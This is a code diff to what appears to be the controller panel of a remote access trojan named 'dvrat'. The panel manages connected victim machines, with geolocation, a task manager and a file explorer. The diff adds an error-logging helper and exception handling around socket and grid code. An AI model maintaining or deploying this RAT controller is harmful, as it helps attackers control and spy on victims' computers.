@@ -17,6 +17,7 @@ using System.Threading;
 using System.Runtime.InteropServices;
 using System.Net;
 using Newtonsoft.Json.Linq;
+using System.IO;
 
 namespace dvrat
 {
@@ -284,8 +285,16 @@ namespace dvrat
         {
             if (!SocketConnected(client))
             {
-                dataGridView1.Rows.RemoveAt(get_client_index(client));
-                return true;
+                try
+                {
+                    dataGridView1.Rows.RemoveAt(get_client_index(client));
+                    return true;
+                }
+                catch (Exception ex)
+                {
+                    error_log_file(ex.ToString());
+                    return false;
+                }
             }
             else
             {
@@ -346,9 +355,9 @@ namespace dvrat
                     }
                     Thread.Sleep(1000);
                 }
-                catch (Exception)
+                catch (Exception ex)
                 {
-                    //pass
+                    error_log_file(ex.ToString());
                 }
 
                 for (int i = 0; i < dataGridView1.Rows.Count; ++i)
@@ -369,8 +378,15 @@ namespace dvrat
                         }
                         if (!SocketConnected(client))
                         {
-                            clients_sockets.RemoveAt(i);
-                            dataGridView1.Rows.RemoveAt(i);
+                            try
+                            {
+                                clients_sockets.RemoveAt(i);
+                                dataGridView1.Rows.RemoveAt(i);
+                            }
+                            catch (Exception ex)
+                            {
+                                error_log_file(ex.ToString());
+                            }
                         }
                         else
                         {
@@ -394,9 +410,9 @@ namespace dvrat
                     Thread.Sleep(500);
                 }
             }
-            catch (Exception )
+            catch (Exception ex)
             {
-                //pass
+                error_log_file(ex.ToString());
             }
         }
 
@@ -413,6 +429,47 @@ namespace dvrat
         #endregion
 
         #region helper functions
+
+
+        private void error_log_file(string error)
+        {
+            string file_name = "log\\error.log.txt";
+            string time = DateTime.Now.ToString();
+            string log = $"{time} {error}\n";
+            Byte[] bLog = new UTF8Encoding(true).GetBytes(log);
+            FileStream fs;
+            StreamWriter sw;
+            if (!Directory.Exists("log"))
+            {
+                Directory.CreateDirectory("log");
+
+                using (fs = File.Create(file_name))
+                {
+                    fs.Write(bLog, 0, bLog.Length);
+                }
+
+            }else if (!File.Exists(file_name))
+            {
+                using (fs = File.Create(file_name))
+                {
+                    fs.Write(bLog, 0, bLog.Length);
+                }
+            }
+            else
+            {
+                FileInfo fi = new FileInfo(file_name);
+                if(fi.Length > 300_000)
+                {
+                    File.Delete(file_name);
+                }
+                using (sw = File.AppendText(file_name))
+                {
+                    sw.WriteLine(log);
+                }
+            }
+            GC.Collect();
+        }
+
         //it is Fucntions help you in someting like get info of an ip or get The size of data in string etc...
         private string getIpInfo(string ip)
         {
@@ -460,8 +517,9 @@ namespace dvrat
                 upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(send_bytes)} ]"; upload_label.Refresh(); }));
                 return true;
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                error_log_file(ex.ToString());
                 return false;
             }
         }
@@ -478,10 +536,15 @@ namespace dvrat
             {
                 return this.clients_sockets[i];
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                error_log_file(ex.ToString());
                 dataGridView1.Rows.RemoveAt(i);//Client not on index
                 return null;
+            }
+            finally
+            {
+                //pass
             }
         }
 
@@ -507,14 +570,16 @@ namespace dvrat
 
                         return sentBytesCount == 1;
                     }
-                    catch
+                    catch(Exception ex)
                     {
+                        error_log_file(ex.ToString());
                         return false;
                     }
                 }
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                error_log_file(ex.ToString());
                 return false;
             }
         }
@@ -526,6 +591,7 @@ namespace dvrat
             {
                 try
                 {
+
                     for (int i = 0; i <= clients_sockets.Count; i++)
                     {
                         Socket client = clients_sockets[i];
@@ -545,9 +611,9 @@ namespace dvrat
                         }
                     }
                 }
-                catch (Exception )
+                catch (Exception ex)
                 {
-                    //pass
+                    error_log_file(ex.ToString());
                 }
                 Thread.Sleep(1000);
             }
@@ -648,6 +714,7 @@ namespace dvrat
                             }
                             catch (Exception ex)
                             {
+                                error_log_file(ex.ToString());
                                 empty_recv += 1;
                                 no_ok += 1;
                                 goto _start_recv;
@@ -681,8 +748,16 @@ namespace dvrat
                                     string ip_info = getIpInfo(ip);
                                     var obj = JObject.Parse(ip_info);
                                     string country_code = $"{obj["countryCode"]}";
-                                    country_image = new Bitmap($"res\\Flags\\{country_code.ToLower()}.png");
-                                    dataGridView1.Invoke(new MethodInvoker(() =>
+                            try
+                            {
+                                country_image = new Bitmap($"res\\Flags\\{country_code.ToLower()}.png");
+                            }
+                            catch(Exception ex)
+                            {
+                                error_log_file(ex.ToString());
+                                country_image = new Bitmap($"res\\Flags\\-1.png");
+                            }
+                            dataGridView1.Invoke(new MethodInvoker(() =>
                                     {
                                         index_row_of_grid = dataGridView1.Rows.Add(
                                         country_image,
@@ -730,6 +805,7 @@ namespace dvrat
                                 }
                                 catch (Exception ex)
                                 {
+                                    error_log_file(ex.ToString());
                                     // the error must be that the client don't send its info so its not on the Grid !
                                     if (!SocketConnected(client_socket))
                                     {
@@ -764,8 +840,9 @@ namespace dvrat
                                         tsk_mgr_form.victm_name = dataGridView1.Rows[this.selected_client_index].Cells["_PC_NAME"].Value.ToString();
                                         tsk_mgr_form.ShowDialog();
                                     }
-                                    catch (Exception) //something wrong with chunk
+                                    catch (Exception ex) //something wrong with chunk
                                     {
+                                        error_log_file(ex.ToString());
                                         bytes_recv = client_socket.Receive(buffer_recv);
                                         string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
                                         chunk += string_recv; // it should be the complete of chunk with out tags
@@ -820,6 +897,7 @@ namespace dvrat
                                         }
                                         catch (Exception ex)
                                         {
+                                            error_log_file(ex.ToString());
                                             fle_explr_frm._err("can't open file\\folder!");
                                         }
                                     }
@@ -867,6 +945,7 @@ namespace dvrat
                                         }
                                         catch (Exception ex)
                                         {
+                                            error_log_file(ex.ToString());
                                             fle_explr_frm._err("can't open file\\folder!");
                                         }
                                     }
@@ -914,6 +993,7 @@ namespace dvrat
                                         }
                                         catch (Exception ex)
                                         {
+                                            error_log_file(ex.ToString());
                                             fle_explr_frm._err("can't open file\\folder!");
                                         }
                                     }
@@ -979,14 +1059,14 @@ namespace dvrat
                     connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));
                     dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "offline";
                 }
-                catch (Exception)
+                catch (Exception ex)
                 {
-                    /* just pass */
+                    error_log_file(ex.ToString());
                 }
             }
-            catch (Exception )
+            catch (Exception ex)
             {
-                
+                error_log_file(ex.ToString());
             }
             GC.Collect();//Collect to not fill memory
             if (SocketConnected(client_socket)) //Last Check!
